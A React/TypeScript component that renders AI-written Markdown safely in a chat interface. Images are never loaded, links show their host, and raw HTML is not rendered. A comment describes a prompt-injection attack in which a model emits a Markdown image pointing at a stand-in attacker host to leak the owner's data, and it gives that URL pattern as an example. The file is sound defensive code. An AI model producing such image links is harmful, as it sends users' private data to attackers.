import { useCallback, useState, type ComponentPropsWithoutRef, type FC } from "react";
import {
  MarkdownTextPrimitive,
  unstable_memoizeMarkdownComponents as memoizeMarkdownComponents,
  useIsMarkdownCodeBlock,
  type CodeHeaderProps,
} from "@assistant-ui/react-markdown";
import remarkGfm from "remark-gfm";
import { CheckIcon, CopyIcon } from "lucide-react";

import { TooltipIconButton } from "@/components/assistant-ui/tooltip-icon-button";
import { cn } from "@/lib/utils";

const useCopyToClipboard = ({
  copiedDuration = 1500,
}: {
  copiedDuration?: number;
} = {}) => {
  const [isCopied, setIsCopied] = useState(false);

  const copyToClipboard = useCallback(
    (value: string) => {
      if (!value) return;
      navigator.clipboard.writeText(value).then(() => {
        setIsCopied(true);
        setTimeout(() => setIsCopied(false), copiedDuration);
      });
    },
    [copiedDuration],
  );

  return { isCopied, copyToClipboard };
};

const CodeHeader: FC<CodeHeaderProps> = ({ language, code }) => {
  const { isCopied, copyToClipboard } = useCopyToClipboard();
  const onCopy = () => {
    if (!code || isCopied) return;
    copyToClipboard(code);
  };

  return (
    <div className="flex items-center justify-between gap-4 rounded-t-lg border border-b-0 border-border bg-muted px-4 py-2 text-xs font-medium text-muted-foreground">
      <span className="lowercase">{language ?? "code"}</span>
      <TooltipIconButton tooltip="Copy" onClick={onCopy} className="size-6">
        {isCopied ? <CheckIcon /> : <CopyIcon />}
      </TooltipIconButton>
    </div>
  );
};

// Text a model wrote is untrusted. A Markdown image is fetched the moment it renders, with no click, so an injected
// `![](https://evil.example/?d=<owner data>)` would send whatever the model put in the address. Images are therefore
// never drawn: the alt text and the host show as plain text and no `src` reaches the DOM. A link shows its full host
// beside the label, so the label cannot hide where it goes. Raw HTML is not rendered (there is no rehype-raw), so these
// two components are the only way model Markdown reaches a URL.
function webHost(value: unknown): string | null {
  if (typeof value !== "string") return null;
  try {
    const url = new URL(value);
    return url.protocol === "http:" || url.protocol === "https:" ? url.host : null;
  } catch {
    return null;
  }
}

const ModelImage: FC<ComponentPropsWithoutRef<"img">> = ({ src, alt }) => {
  const host = webHost(src);
  return (
    <span className="text-muted-foreground">
      {`[Image not loaded${alt ? `: ${alt}` : ""}${host ? ` (${host})` : ""}]`}
    </span>
  );
};

const ModelLink: FC<ComponentPropsWithoutRef<"a">> = ({ href, children }) => {
  const host = webHost(href);
  // Not a web address (a fragment, a mail or phone link): nothing to open from here, so only its text shows.
  if (!host) return <span>{children}</span>;
  return (
    <>
      <a href={href} target="_blank" rel="noopener noreferrer nofollow" referrerPolicy="no-referrer">
        {children}
      </a>{" "}
      <span className="whitespace-nowrap text-xs text-muted-foreground">({host})</span>
    </>
  );
};

const defaultComponents = memoizeMarkdownComponents({
  CodeHeader,
  img: ModelImage,
  a: ModelLink,
  pre: ({ className, ...props }) => (
    <pre
      className={cn(
        "overflow-x-auto rounded-b-lg border border-border bg-muted p-4 text-sm",
        className,
      )}
      {...props}
    />
  ),
  code: function Code({ className, ...props }) {
    const isCodeBlock = useIsMarkdownCodeBlock();
    return (
      <code
        className={cn(
          !isCodeBlock &&
            "rounded border border-border bg-muted px-1.5 py-0.5 font-mono text-[0.85em]",
          className,
        )}
        {...props}
      />
    );
  },
});

const MarkdownTextImpl: FC = () => {
  return (
    <MarkdownTextPrimitive
      remarkPlugins={[remarkGfm]}
      components={defaultComponents}
      className="prose prose-sm max-w-none break-words text-foreground prose-headings:text-foreground prose-strong:text-foreground prose-a:text-foreground prose-code:text-foreground prose-pre:my-0 prose-pre:bg-transparent prose-pre:p-0 dark:prose-invert"
    />
  );
};

export const MarkdownText = MarkdownTextImpl;
